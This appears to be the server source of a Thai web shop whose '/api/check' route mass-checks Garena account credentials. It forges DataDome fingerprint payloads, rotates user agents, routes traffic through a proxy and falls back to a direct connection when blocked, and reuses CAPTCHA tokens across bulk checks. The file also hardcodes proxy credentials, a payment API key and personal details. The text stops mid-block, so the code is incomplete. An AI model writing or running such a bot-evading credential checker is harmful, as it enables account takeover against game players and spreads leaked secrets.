import express from 'express';
import path from 'path';
import cors from 'cors';
import axios from 'axios';
import { CookieJar } from 'tough-cookie';
import crypto from 'node:crypto';
import { fileURLToPath } from 'url';
import https from 'node:https';
import tls from 'node:tls';
import { HttpsProxyAgent } from 'https-proxy-agent';

import dotenv from 'dotenv';
import rateLimit from 'express-rate-limit';

import { adminDb as admin } from './src/lib/admindb';



dotenv.config({ override: true });

const __dirname = path.dirname(fileURLToPath(import.meta.url));


console.log('[Server] --- Supabase VERSION REBOOT ---');
const app = express();
  const PORT = 3000;

  const injectUser = async (req: any, res: any, next: any) => {
    const authHeader = req.headers.authorization;
    if (authHeader && authHeader.startsWith('Bearer ')) {
      const token = authHeader.split('Bearer ')[1];
      try {
        req.user = await admin.auth().verifyIdToken(token);
        if (req.user.email === 'abopboa.b@gmail.com') {
          req.isAdmin = true;
        } else {
          const adminDoc = await admin.firestore().collection('admins').doc(req.user.uid).get();
          req.isAdmin = !!adminDoc.exists;
        }
      } catch (error) {
        console.error('Error verifying Firebase ID token in injectUser:', error);
      }
    }
    next();
  };

  const requireAuth = async (req: any, res: any, next: any) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Unauthorized: Missing or invalid token' });
    }
    next();
  };

  const requireAdmin = async (req: any, res: any, next: any) => {
    if (!req.user || !req.isAdmin) {
      return res.status(403).json({ error: 'Forbidden: Admin access required' });
    }
    next();
  };

  // API health check immediately
  app.get('/api/health', (req, res) => {
    console.log(`[Health] Request from ${req.headers['x-forwarded-for'] || req.ip}`);
    res.json({ 
      status: 'ok_proof', 
      time: new Date().toISOString(),
      env: process.env.NODE_ENV || 'development'
    });
  });

  app.use(cors({
    origin: function (origin, callback) {
      // Allow requests with no origin (like mobile apps or curl requests)
      if (!origin) return callback(null, true);
      
      const allowedOrigins = [
        'https://apexcheck.space',
        'http://localhost:3000'
      ];
      
      // Allow cloud run domains dynamically
      if (origin.endsWith('.run.app') || allowedOrigins.indexOf(origin) !== -1) {
        callback(null, true);
      } else {
        callback(new Error('Not allowed by CORS'));
      }
    },
    credentials: true
  }));
  app.use(express.json({ limit: '10mb' }));
  app.use(express.urlencoded({ limit: '10mb', extended: true }));
  app.use(injectUser);

  

  // Logging middleware for debugging
  app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
    next();
  });

  // Remove duplicate health check below
  // app.get('/api/health', (req, res) => { ... })
  
  // Site Settings State
  let siteSettings: any = {
    site_name: process.env.VITE_SITE_NAME || 'APEX STUDIO',
    truewallet_phone: process.env.TRUEWALLET_PHONE || '0951378403',
    contact_line: process.env.CONTACT_LINE || '@apex_studio',
    stats_users_offset: 1250,
    stats_sales_offset: 0,
    popup_img_url: 'https://images.unsplash.com/photo-1607083206968-13611e3d76db?auto=format&fit=crop&q=80&w=1500&h=1500',
    popup_enabled: true,
    popup_link: ''
  };

  // Load from DB
  try {
    admin.firestore().collection('settings').doc('site').get().then(doc => {
      if (doc.exists) {
        siteSettings = { ...siteSettings, ...doc.data() };
      }
    }).catch(err => {
      console.warn("Could not load initial site settings from DB (might not exist yet).", err.message || err);
    });
  } catch(e) {}

  app.get('/api/settings', (req, res) => {
    res.json(siteSettings);
  });

  app.post('/api/settings', requireAdmin, async (req, res) => {
    const { truewallet_phone, site_name, contact_line, stats_users_offset, stats_sales_offset, stats_users_override, stats_stock_override, stats_sales_override, popup_img_url, popup_enabled, popup_link } = req.body;
    if (truewallet_phone !== undefined) siteSettings.truewallet_phone = truewallet_phone;
    if (site_name !== undefined) siteSettings.site_name = site_name;
    if (contact_line !== undefined) siteSettings.contact_line = contact_line;
    if (stats_users_offset !== undefined) siteSettings.stats_users_offset = parseInt(stats_users_offset) || 0;
    if (stats_sales_offset !== undefined) siteSettings.stats_sales_offset = parseInt(stats_sales_offset) || 0;
    if (stats_users_override !== undefined) siteSettings.stats_users_override = parseInt(stats_users_override);
    if (stats_stock_override !== undefined) siteSettings.stats_stock_override = parseInt(stats_stock_override);
    if (stats_sales_override !== undefined) siteSettings.stats_sales_override = parseInt(stats_sales_override);
    if (popup_img_url !== undefined) siteSettings.popup_img_url = popup_img_url;
    if (popup_enabled !== undefined) siteSettings.popup_enabled = popup_enabled === true || popup_enabled === 'true';
    if (popup_link !== undefined) siteSettings.popup_link = popup_link;
    
    // Clear cached stats so they refresh next time someone calls /api/stats
    lastStatsFetch = 0;
    
    try {
      await admin.firestore().collection('settings').doc('site').set(siteSettings, { merge: true });
    } catch(e) {
      console.error('Failed to save settings', e);
    }
    
    console.log(`[Settings] Updated:`, siteSettings);
    return res.json({ success: true, settings: siteSettings });
  });

  app.post('/api/topup/truemoney', async (req, res) => {
    try {
      const { voucherCode, uid } = req.body;
      const phone = siteSettings.truewallet_phone;
      
      if (!voucherCode) {
        return res.status(400).json({ success: false, error: 'กรุณากรอกลิงก์ซองของขวัญ' });
      }

      // Extract voucher hash from URL or use as is
      let voucherHash = voucherCode.trim();
      
      // If it's a full URL, extract from ?v= or &v=
      const urlMatch = voucherHash.match(/[?&]v=([^&#\s]+)/);
      if (urlMatch) {
        voucherHash = urlMatch[1];
      } else if (voucherHash.includes('truemoney.com')) {
        // Fallback for some links that might skip the 'v=' but contain hash in some way
        const parts = voucherHash.split('/');
        const lastPart = parts[parts.length - 1];
        if (lastPart && lastPart.length >= 10) {
          voucherHash = lastPart;
        }
      }
      
      // Final cleanup: just in case there's whitespace or extra chars
      voucherHash = voucherHash.replace(/[^a-zA-Z0-9]/g, '');

      console.log(`[TrueWallet] Attempting to redeem via XPLUEM: "${voucherHash}" for phone: ${phone}`);

      // Using the new API: https://api.xpluem.com/:link/:phone
      const response = await axios.get(`https://api.xpluem.com/${voucherHash}/${phone}`, {
          timeout: 15000,
          validateStatus: (status) => status < 500
      });

      const result = response.data;
      console.log(`[TrueWallet] XPLUEM Response:`, JSON.stringify(result));

      if (result.success === true) {
          const amount = parseFloat(result.data?.amount || 0);
          console.log(`[TrueWallet] Successfully redeemed ฿${amount}`);

          if (uid) {
            try {
              const userRef = admin.firestore().collection('users').doc(uid);
              const userDoc = await userRef.get();
              if (userDoc.exists) {
                const currentBalance = userDoc.data().balance || 0;
                await userRef.update({ balance: currentBalance + amount });
                console.log(`[TrueWallet] Updated balance for user ${uid} (+฿${amount})`);
              }
            } catch (syncErr) {
              console.error(`[TrueWallet] Balance sync error:`, syncErr);
            }
          }

          return res.json({ 
            success: true, 
            amount,
            message: result.message || 'รับเงินสำเร็จ'
          });
      } else {
          const errorMsg = result.message || 'ไม่สามารถรับเงินได้ (สถานะไม่สำเร็จ)';
          console.warn(`[TrueWallet] Failed: ${errorMsg}`);
          return res.json({ success: false, error: errorMsg });
      }
    } catch (error: any) {
        console.error("[TrueWallet] Gateway Error:", error.message);
        if (error.response) {
            const result = error.response.data;
            return res.json({ success: false, error: result?.message || 'เกิดข้อผิดพลาดในการเชื่อมต่อเซิร์ฟเวอร์ API' });
        }
        return res.status(500).json({ success: false, error: 'เกิดข้อผิดพลาดในการเชื่อมต่อเครือข่าย' });
    }
  });

  const usedSlips = new Set<string>();

  app.post('/api/topup/slip', async (req, res) => {
    try {
      const { imageBase64, uid } = req.body;
      if (!imageBase64) {
        return res.status(400).json({ success: false, error: 'ข้อมูลไม่ครบถ้วน' });
      }

      const imageBuffer = Buffer.from(imageBase64, 'base64');
      const blob = new Blob([imageBuffer], { type: 'image/jpeg' });
      const form = new FormData();
      form.append('files', blob, 'slip.jpg');

      const response = await axios.post(
        'https://api.slipok.com/api/line/apikey/65331',
        form,
        {
          headers: {
            'x-authorization': 'SLIPOKA9ZEE71'
          }
        }
      );

      // Checking response format from SlipOK
      if (response.data.success === true || response.data.code === '0000' || response.data.data?.amount !== undefined) {
        const amount = response.data.data?.amount;
        const transRef = response.data.data?.transRef;
        const receiverProxy = response.data.data?.receiver?.proxy?.value || '';
        const receiverName = response.data.data?.receiver?.displayName || response.data.data?.receiver?.name || '';
        
        const EXPECTED_SHOP_NAME_1 = "ด.ช. กรวิชญ์ มาตขาว";
        const EXPECTED_SHOP_NAME_2 = "Master Korawit Makthaw";
        
        // ตรวจสอบชื่อบัญชีร้าน
        const isMatch = receiverName.includes(EXPECTED_SHOP_NAME_1) || 
                        receiverName.toUpperCase().includes(EXPECTED_SHOP_NAME_2.toUpperCase()) ||
                        receiverName.includes("กรวิชญ์");
        
        if (!isMatch) {
            return res.json({ 
              success: false, 
              error: `ชื่อบัญชีผู้รับเงินไม่สมบูรณ์ (สลิปโอนไปที่: ${receiverName || 'ไม่ระบุ'}) ไม่ตรงกับชื่อบัญชีของทางร้าน กรุณาติดต่อแอดมิน` 
            });
        }
        
        if (transRef) {
          // Check if used in DB
          try {
             const existingRef = await admin.firestore().collection('slips').doc(transRef).get();
             if (existingRef.exists) {
                return res.json({ success: false, error: 'สลิปนี้ถูกใช้งานไปแล้ว (ตรวจสอบจากระบบ)' });
             }
             await admin.firestore().collection('slips').doc(transRef).set({
               uid,
               amount,
               used_at: new Date().toISOString()
             });
          } catch(e) {
             // Fallback to local memory if DB fails
             if (usedSlips.has(transRef)) {
               return res.json({ success: false, error: 'สลิปนี้ถูกใช้งานไปแล้ว (local)' });
             }
             usedSlips.add(transRef);
          }
        }

        if (uid) {
          try {
            const userRef = admin.firestore().collection('users').doc(uid);
            const userDoc = await userRef.get();
            if (userDoc.exists) {
              const currentBalance = userDoc.data().balance || 0;
              await userRef.update({ balance: currentBalance + amount });
              console.log(`[Slip] Updated balance for user ${uid} (+฿${amount})`);
            }
          } catch (syncErr) {
            console.error(`[Slip] Balance sync error:`, syncErr);
          }
        }

        return res.json({ success: true, amount });
      } else {
        const errorMsg = response.data.data?.message || response.data.message;
        return res.json({ success: false, error: errorMsg || 'ไม่สามารถรับเงินได้' });
      }
    } catch (error: any) {
        if (error.response) {
            const errorMsg = error.response.data?.message;
            return res.json({ success: false, error: errorMsg || 'สลิปไม่ถูกต้อง หรือถูกใช้งานไปแล้ว' });
        } else {
            console.error("SlipOK API Error:", error.message);
            return res.status(500).json({ success: false, error: 'เกิดข้อผิดพลาดในการเชื่อมต่อเครือข่าย' });
        }
    }
  });

  app.post('/api/verify_turnstile', async (req, res) => {
    try {
      const { token } = req.body;
      const secretKey = process.env.TURNSTILE_SECRET_KEY || '';

      if (!secretKey) {
          return res.json({ success: true, message: "Bypassed missing Turnstile Secret Key." });
      }

      console.log('Verify Turnstile called with token:', token);
      
      if (!token) {
        return res.status(400).json({ success: false, error: 'Token missing' });
      }

      const params = new URLSearchParams();
      params.append('secret', secretKey);
      params.append('response', token);

      const response = await axios.post(
        'https://challenges.cloudflare.com/turnstile/v0/siteverify',
        params.toString(),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          validateStatus: () => true
        }
      );

      console.log('Turnstile Response:', response.data);
      
      if (!response.data.success) {
        return res.status(403).json(response.data);
      }
      return res.json(response.data);
    } catch (error: any) {
      console.error('Turnstile verification error:', error.message || error);
      return res.status(500).json({ success: false, error: 'Internal server error', detail: error.message });
    }
  });

    // --- Precise Garena Checking Logic using node:crypto ---
  
  const getMD5 = (text: string) => {
    let raw = text;
    try {
      if (text.includes('%')) {
        raw = decodeURIComponent(text);
      }
    } catch (e) {}
    return crypto.createHash('md5').update(raw).digest('hex');
  };

  const encryptPassword = (password: string, v1: string, v2: string) => {
    const passMd5 = getMD5(password);
    const innerHash = crypto.createHash('sha256').update(passMd5 + v1).digest('hex');
    const outerHash = crypto.createHash('sha256').update(innerHash + v2).digest('hex');
    const key = Buffer.from(outerHash, 'hex');
    const plaintext = Buffer.from(passMd5, 'hex');
    const cipher = crypto.createCipheriv('aes-256-ecb', key, null);
    cipher.setAutoPadding(false);
    let encrypted = cipher.update(plaintext);
    encrypted = Buffer.concat([encrypted, cipher.final()]);
    return encrypted.toString('hex').substring(0, 32);
  };

  const getCodmInfo = async (client: any) => {
    try {
      const random_id = Date.now().toString();
      const token_url = "https://auth.garena.com/oauth/token/grant";
      const token_data = `client_id=100082&response_type=token&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F&format=json&id=${random_id}`;
      
      const token_res = await client.post(token_url, token_data, {
        headers: {
          "User-Agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
          "Content-Type": "application/x-www-form-urlencoded",
          "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
        }
      });
      
      const access_token = token_res.data.access_token;
      if (!access_token) return null;

      // Callback to CODM
      const codm_callback_url = `https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token=${access_token}`;
      await client.get(codm_callback_url, { maxRedirects: 0, validateStatus: (s: number) => s < 400 });

      // API callback
      const api_callback_url = `https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token=${access_token}`;
      const api_callback_res = await client.get(api_callback_url, { maxRedirects: 0, validateStatus: (s: number) => s < 400 });
      const location = api_callback_res.headers['location'] || '';

      if (location.includes("err=3")) return null;
      if (location.includes("token=")) {
        const token = location.split("token=")[1].split('&')[0];
        const check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/";
        const check_res = await client.get(check_login_url, {
          headers: {
            "codm-delete-token": token,
            "Referer": "https://delete-request.codm.garena.co.id/"
          }
        });
        
        const user_data = check_res.data.user;
        if (user_data) {
          return {
            nickname: user_data.codm_nickname || 'N/A',
            level: user_data.codm_level || 'Unknown',
            region: user_data.region || 'N/A',
            uid: user_data.uid || 'N/A',
            open_id: user_data.open_id || 'N/A',
            t_open_id: user_data.t_open_id || 'N/A'
          };
        }
      }
    } catch (e) {
      // console.error("CODM Info Fetch Error:", e.message);
    }
    return null;
  };

  const getGameConnections = async (client: any) => {
    const game_info: string[] = [];
    const valid_regions = ['sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'];
    
    const game_mappings: any = {
      'tw': {
          "100082": "CODM",
          "100067": "FREE FIRE",
          "100070": "SPEED DRIFTERS",
          "100130": "BLACK CLOVER M",
          "100105": "GARENA UNDAWN",
          "100050": "ROV",
          "100151": "DELTA FORCE",
          "100147": "FAST THRILL",
          "100107": "MOONLIGHT BLADE"
      },
      'th': {
          "100067": "FREEFIRE",
          "100055": "ROV",
          "100082": "CODM",
          "100151": "DELTA FORCE",
          "100105": "GARENA UNDAWN",
          "100130": "BLACK CLOVER M",
          "100070": "SPEED DRIFTERS",
          "32836": "FC ONLINE",
          "100071": "FC ONLINE M",
          "100124": "MOONLIGHT BLADE"
      },
      'vn': {
          "32837": "FC ONLINE",
          "100072": "FC ONLINE M",
          "100054": "ROV",
          "100137": "THE WORLD OF WAR"
      },
      'default': {
          "100082": "CODM",
          "100067": "FREEFIRE",
          "100151": "DELTA FORCE",
          "100105": "GARENA UNDAWN",
          "100057": "AOV",
          "100070": "SPEED DRIFTERS",
          "100130": "BLACK CLOVER M",
          "100055": "ROV"
      }
    };

    try {
      const token_url = "https://authgop.garena.com/oauth/token/grant";
      const token_data = `client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id=${Date.now()}`;
      const token_res = await client.post(token_url, token_data, {
        headers: { 
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
          "Content-Type": "application/x-www-form-urlencoded" 
        }
      });
      const access_token = token_res.data.access_token;
      if (!access_token) return [];

      const inspect_url = "https://shop.garena.sg/api/auth/inspect_token";
      const inspect_res = await client.post(inspect_url, { token: access_token }, {
          headers: {
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
              "Content-Type": "application/json"
          }
      });

      const session_key_roles = inspect_res.headers['set-cookie']?.find((c: string) => c.startsWith('session_key='))?.split(';')[0]?.split('=')[1] || inspect_res.cookies?.session_key;
      
      const uac = (inspect_res.data.uac || "ph").toLowerCase();
      const region = valid_regions.includes(uac) ? uac : 'ph';
      
      let base_domain = `shop.garena.${region}`;
      if (region === 'th' || region === 'in') base_domain = "termgame.com";
      else if (region === 'id') base_domain = "kiosgamer.co.id";
      else if (region === 'vn') base_domain = "napthe.vn";

      const applicable_games = game_mappings[region] || game_mappings['default'];
      for (const [app_id, game_name] of Object.entries(applicable_games)) {
        try {
          const roles_res = await client.get(`https://${base_domain}/api/shop/apps/roles`, {
            params: { app_id },
            headers: {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                'Referer': `https://${base_domain}/?app=${app_id}`
            }
          });
          const roles_data = roles_res.data;
          let role = null;
          if (Array.isArray(roles_data.role) && roles_data.role.length > 0) role = roles_data.role[0];
          else if (roles_data[app_id] && Array.isArray(roles_data[app_id]) && roles_data[app_id].length > 0) role = roles_data[app_id][0].role;

          if (role) game_info.push(`[${region.toUpperCase()} - ${game_name} - ${role}]`);
        } catch (e) {}
      }
      
      if (game_info.length === 0) {
          game_info.push(`[${region.toUpperCase()} - No Game Detected]`);
      }
    } catch (e) {}
    return game_info;
  };

  // Add RateLimiting to prevent bot attacks
  const checkLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // Limit each IP to 100 requests per `window` (here, per 15 minutes)
    standardHeaders: true, // Return rate limit info in the `RateLimit-*` headers
    legacyHeaders: false, // Disable the `X-RateLimit-*` headers
    message: { error: 'ขออภัย คุณส่งคำร้องขอเยอะเกินไป (Anti-Bot Protection) กรุณารอสักครู่' }
  });

  // Cache for Turnstile tokens (since they are single-use against Cloudflare, but we need them for a bulk loop)
  const turnstileCache = new Map<string, number>();

  app.post('/api/check', checkLimiter, async (req, res) => {
    const account = req.body.account?.toString().trim();
    const password = req.body.password?.toString().trim();
    const turnstileToken = req.body.turnstileToken; // Optional turnstile token

    if (!account || !password) return res.status(400).json({ error: 'Missing credentials' });

    // Verify Turnstile Token
    if (!turnstileToken) {
       return res.status(403).json({ error: 'Missing Captcha token. Please refresh the page and verify you are human.' });
    }

    // Since a batch check loop uses the same token, we cache verified tokens for 5 minutes
    const now = Date.now();
    const cachedTime = turnstileCache.get(turnstileToken);
    
    if (cachedTime && (now - cachedTime < 5 * 60 * 1000)) {
       // Token is already verified and within 5 minute window
       // console.log("Used cached Turnstile token bypass");
    } else {
       const secretKey = process.env.TURNSTILE_SECRET_KEY || '';
       
       if (!secretKey) {
           turnstileCache.set(turnstileToken, now);
       } else {
           try {
             const params = new URLSearchParams();
             params.append('secret', secretKey);
             params.append('response', turnstileToken);

         const turnstileResponse = await axios.post(
           'https://challenges.cloudflare.com/turnstile/v0/siteverify',
           params,
           {
             headers: {
               'Content-Type': 'application/x-www-form-urlencoded'
             }
           }
         );

         if (!turnstileResponse.data.success) {
           console.error('Turnstile verification failed:', turnstileResponse.data);
           return res.status(403).json({ error: 'Turnstile verification failed. Please refresh the page and try again.' });
         }

         // Cache the successfully verified token
         turnstileCache.set(turnstileToken, now);
         
         // Clean up old entries from cache every once in a while
         if (turnstileCache.size > 1000) {
           for (const [key, time] of turnstileCache.entries()) {
             if (now - time > 5 * 60 * 1000) {
               turnstileCache.delete(key);
             }
           }
         }
       } catch (error) {
         console.error('Error verifying Turnstile token:', error);
         return res.status(500).json({ error: 'Internal server error during captcha verification.' });
       }
       }
    }

    const jar = new CookieJar();
    
    // User-Agent Pool for basic rotation
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    ];
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    const isEdge = randomUserAgent.includes('Edg/');
    const isMac = randomUserAgent.includes('Mac OS');
    const chromeVer = randomUserAgent.match(/Chrome\/(\d+)\./)?.[1] || '130';
    
    let secChUa = isEdge 
      ? `"Chromium";v="${chromeVer}", "Microsoft Edge";v="${chromeVer}", "Not?A_Brand";v="99"`
      : `"Chromium";v="${chromeVer}", "Google Chrome";v="${chromeVer}", "Not?A_Brand";v="99"`;
    let secChPlatform = isMac ? '"macOS"' : '"Windows"';

    // Webshare Proxy provided by user
    const proxyUrl = `http://hfbbfxvi:dn64aepbgf6n@31.59.20.176:6754`;
    
    let agent;
    try {
      if (proxyUrl) {
        // 10s timeout so the proxy fails BEFORE the platform (Cloud Run/Nginx) limit
        agent = new HttpsProxyAgent(proxyUrl, { timeout: 10000, rejectUnauthorized: false } as any);
      } else {
        agent = new https.Agent({ rejectUnauthorized: false });
      }
    } catch (err) {
      console.error('Failed to initialize proxy agent:', err);
      agent = new https.Agent({ rejectUnauthorized: false });
    }

    
    const controller = new AbortController();
    // 10s hard limit for the whole route to ensure we respond with JSON before platform drop
    const timeoutId = setTimeout(() => controller.abort(), 10000); 

    
    // Make sure we clear the timeout when the request closes or route returns
    res.on('finish', () => clearTimeout(timeoutId));
    res.on('close', () => clearTimeout(timeoutId));

    const axiosConfig: any = { 
      headers: {
        'User-Agent': randomUserAgent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
        'Referer': 'https://sso.garena.com/'
      },
      httpsAgent: agent,
      httpAgent: agent,
      proxy: false,
      timeout: 10000,
      signal: controller.signal,
      validateStatus: (status: number) => status < 500
    };
    const client = axios.create(axiosConfig);

    // Manual Cookie Management to avoid HttpsProxyAgent conflict with axios-cookiejar-support
    client.interceptors.request.use(async (config) => {
      try {
        const url = config.url || '';
        const cookie = await jar.getCookieString(url.startsWith('http') ? url : (config.baseURL || '') + url);
        if (cookie) {
          if (config.headers && typeof config.headers.set === 'function') {
            try {
              config.headers.set('Cookie', cookie);
            } catch (ignore) {}
          } else if (config.headers) {
            try {
              (config.headers as any)['Cookie'] = cookie;
            } catch (ignore) {}
          }
        }
      } catch (e) {
        console.error("Cookie request interceptor error:", e);
      }
      return config;
    }, (error) => Promise.reject(error));

    client.interceptors.response.use(async (response) => {
      try {
        const setCookies = response.headers['set-cookie'];
        if (setCookies) {
          const url = response.config.url || '';
          const targetUrl = url.startsWith('http') ? url : (response.config.baseURL || '') + url;
          for (const cookieStr of setCookies) {
            await jar.setCookie(cookieStr, targetUrl);
          }
        }
      } catch (e) {
        console.error("Cookie response interceptor error:", e);
      }
      return response;
    }, (error) => Promise.reject(error));

    try {
      // 1. Precise DataDome Handshake with updated fingerprint
      const ddPayloadObj = {
        "ttst": 76.70000004768372, "ifov": false, "hc": 4, "br_oh": 824, "br_ow": 1536,
        "ua": randomUserAgent,
        "wbd": false, "dp0": true, "tagpu": 5.738121195951787, "wdif": false, "wdifrm": false,
        "npmtm": false, "br_h": 738, "br_w": 260, "isf": false, "nddc": 1, "rs_h": 864,
        "rs_w": 1536, "rs_cd": 24, "phe": false, "nm": false, "jsf": false, "lg": "en-US",
        "pr ": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": true, "str_ls": true,
        "str_idb": true, "str_odb": false, "plgod": false, "plg": 5, "plgne": true, "plgre": true,
        "plgof": false, "plggt": false, "pltod": false, "hcovdr": false, "hcovdr2": false,
        "plovdr": false, "plovdr2": false, "ftsovdr": false, "ftsovdr2": false, "lb": false,
        "eva": 33, "lo": false, "ts_mtp": 0, "ts_tec": false, "ts_tsa": false, "vnd": "Google Inc.",
        "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
        "hdn": false, "awe": false, "geb": false, "dat": false, "med": "defined", "aco": "probably",
        "acots": false, "acmp": "probably", "acmpts": true, "acw": "probably", "acwts": false,
        "acma": "maybe", "acmats": false, "ac3": "", "ac3ts": false, "acf": "probably", "acfts": false,
        "acmp4": "maybe", "acmp4ts": false, "acmp3": "probably", "acmp3ts": false, "acwm": "maybe",
        "acwmts": false, "ocpt": false, "vco": "", "vcots": false, "vch": "probably", "vchts": true,
        "vcw": "probably", "vcwts": true, "vc3": "maybe", "vc3ts": false, "vcmp": "", "vcmpts": false,
        "vcq": "maybe", "vcqts": false, "vc1": "probably", "vc1ts": true, "dvm": 8, "sqt": false,
        "so": "landscape-primary", "bda": false, "wdw": true, "prm": true, "tzp": true, "cvs": true,
        "usb": true, "cap": true, "tbf": false, "lgs": true, "tpd": true
      };
      
      const payloadParams = new URLSearchParams();
      payloadParams.append('jsData', JSON.stringify(ddPayloadObj));
      payloadParams.append('eventCounters', '[]');
      payloadParams.append('jsType', 'ch');
      payloadParams.append('cid', 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae');
      payloadParams.append('ddk', 'AE3F04AD3F0D3A462481A337485081');
      payloadParams.append('Referer', 'https://account.garena.com/');
      payloadParams.append('request', '/');
      payloadParams.append('responsePage', 'origin');
      payloadParams.append('ddv', '4.35.4');
      
      const ddPayload = payloadParams.toString();

      console.log('--- Calling DataDome ---');
      const ddRes = await client.post('https://dd.garena.com/js/', ddPayload, {
        headers: { 
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9',
          'content-type': 'application/x-www-form-urlencoded',
          'origin': 'https://account.garena.com',
          'referer': 'https://account.garena.com/',
          'sec-ch-ua': secChUa,
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': secChPlatform,
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-site',
          'user-agent': randomUserAgent
        }
      });
      console.log('--- DataDome Done ---');

      if (ddRes.data && ddRes.data.cookie) {
        const ddCookieParts = ddRes.data.cookie.split(';');
        const ddCookieValue = ddCookieParts[0];
        await jar.setCookie(ddCookieValue, 'https://sso.garena.com');
      }

      // Small delay to simulate human-like transition
      await new Promise(r => setTimeout(r, 800 + Math.random() * 500));

      let usedDirectClient = false;
      let directClient;
      let preloginRes;

      if (ddRes.status === 403) {
        console.log('--- DataDome Proxy 403. Skipping proxy Prelogin. ---');
        preloginRes = { status: 403 };
      } else {
        // 2. Prelogin Challenge with enhanced headers
        console.log('--- Calling Prelogin ---');
        preloginRes = await client.get('https://sso.garena.com/api/prelogin', {
          params: { app_id: '10100', account, format: 'json', id: Date.now() },
          headers: {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'connection': 'keep-alive',
            'host': 'sso.garena.com',
            'referer': 'https://account.garena.com/',
            'sec-ch-ua': secChUa,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': secChPlatform,
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': randomUserAgent
          }
        });
        console.log('--- Prelogin Done ---');
      }

      if (preloginRes.status === 403) {
        console.log('--- Proxy 403. Trying DIRECT connection (No Proxy) ---');
        // Fallback to Server IP
        usedDirectClient = true;
        const directAgent = new https.Agent({ rejectUnauthorized: false });
        directClient = axios.create({ ...axiosConfig, httpsAgent: directAgent, httpAgent: directAgent });
        
        // Attach same cookie jar logic
        directClient.interceptors.request.use(async (config) => {
          try {
            const url = config.url || '';
            const cookie = await jar.getCookieString(url.startsWith('http') ? url : (config.baseURL || '') + url);
            if (cookie) {
              if (config.headers && typeof config.headers.set === 'function') config.headers.set('Cookie', cookie);
              else if (config.headers) (config.headers as any)['Cookie'] = cookie;
            }
          } catch (e) {}
          return config;
        }, (e) => Promise.reject(e));

        directClient.interceptors.response.use(async (response) => {
          try {
            const setCookies = response.headers['set-cookie'];
            if (setCookies) {
              const targetUrl = response.config.url?.startsWith('http') ? response.config.url : (response.config.baseURL || '') + (response.config.url || '');
              for (const cookieStr of setCookies) await jar.setCookie(cookieStr, targetUrl);
            }
          } catch (e) {}
          return response;
        }, (e) => Promise.reject(e));

        jar.removeAllCookiesSync();

        console.log('--- Calling DataDome (Direct) ---');
        const fallbackDdRes = await directClient.post('https://dd.garena.com/js/', ddPayload, {
          headers: { 
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://account.garena.com',
            'referer': 'https://account.garena.com/',
            'sec-ch-ua': secChUa,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': secChPlatform,
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': randomUserAgent
          }
        });

        if (fallbackDdRes.data && fallbackDdRes.data.cookie) {
